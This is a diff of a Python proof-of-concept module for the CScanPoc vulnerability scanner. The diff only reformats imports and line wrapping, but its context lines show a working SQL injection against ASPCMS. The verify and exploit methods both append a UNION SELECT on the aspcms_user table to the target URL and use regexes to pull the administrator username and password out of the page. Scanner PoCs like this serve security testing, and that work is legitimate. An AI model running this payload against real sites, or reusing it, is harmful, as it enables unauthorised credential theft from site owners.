@@ -2,8 +2,12 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import urllib.request, urllib.parse, urllib.error
-import urllib.request, urllib.error, urllib.parse
+import urllib.request
+import urllib.parse
+import urllib.error
+import urllib.request
+import urllib.error
+import urllib.parse
 import re
 
 
@@ -42,9 +46,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -54,7 +59,8 @@ class Poc(ABPoc):
                    "24,25,26,27,28,29,30,31,32,33,34,35%20from%20aspcms_user%20where%20userid=1")
 
             verify_url = '{target}'.format(target=self.target)+exp
-            content = urllib.request.urlopen(urllib.request.Request(verify_url)).read()
+            content = urllib.request.urlopen(
+                urllib.request.Request(verify_url)).read()
             pattern = re.compile(r'.*?name=[\'"]?SortName[\'"]?.*?value=[\'"]?(?P<username>\w+)[\'"]?'  # 匹配用户名
                                  # 匹配密码
                                  r'.*?name=[\'"]?PageTitle[\'"]?.*?value=[\'"]?(?P<password>\w+)[\'"]?',
@@ -68,7 +74,8 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                 target=self.target, vuln=self.vuln))
@@ -78,7 +85,8 @@ class Poc(ABPoc):
                    "24,25,26,27,28,29,30,31,32,33,34,35%20from%20aspcms_user%20where%20userid=1")
 
             verify_url = '{target}'.format(target=self.target)+exp
-            content = urllib.request.urlopen(urllib.request.Request(verify_url)).read()
+            content = urllib.request.urlopen(
+                urllib.request.Request(verify_url)).read()
             pattern = re.compile(r'.*?name=[\'"]?SortName[\'"]?.*?value=[\'"]?(?P<username>\w+)[\'"]?'  # 匹配用户名
                                  # 匹配密码
                                  r'.*?name=[\'"]?PageTitle[\'"]?.*?value=[\'"]?(?P<password>\w+)[\'"]?',
